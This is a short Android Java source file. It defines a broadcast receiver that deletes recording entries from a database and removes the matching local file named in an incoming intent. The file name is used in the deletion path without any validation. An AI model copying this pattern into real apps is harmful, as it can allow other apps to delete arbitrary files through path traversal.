package com.android.network.detect;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class DeleteDataReceiver extends BroadcastReceiver {

    private final String LOG_TAG = AppGlobals.getLogTag(getClass());

    @Override
    public void onReceive(Context context, Intent intent) {
        String fileName = intent.getStringExtra("FILE_NAME");
        System.out.println(fileName);
        RecordingDatabaseHelper dbHelpers = new RecordingDatabaseHelper(context);
        UploadRecordingTaskHelpers uploadHelpers = new UploadRecordingTaskHelpers(context);
        Helpers helpers = new Helpers(context);
        dbHelpers.deleteItem(SqliteHelpers.COULMN_UPLOAD,helpers.path+fileName);
        dbHelpers.deleteItem(SqliteHelpers.COULMN_DELETE,fileName);
        Log.i(LOG_TAG, "Delete from DB");
        uploadHelpers.removeFiles(helpers.path + "/" + fileName);
        Log.i(LOG_TAG, "local file deleted");
    }
}
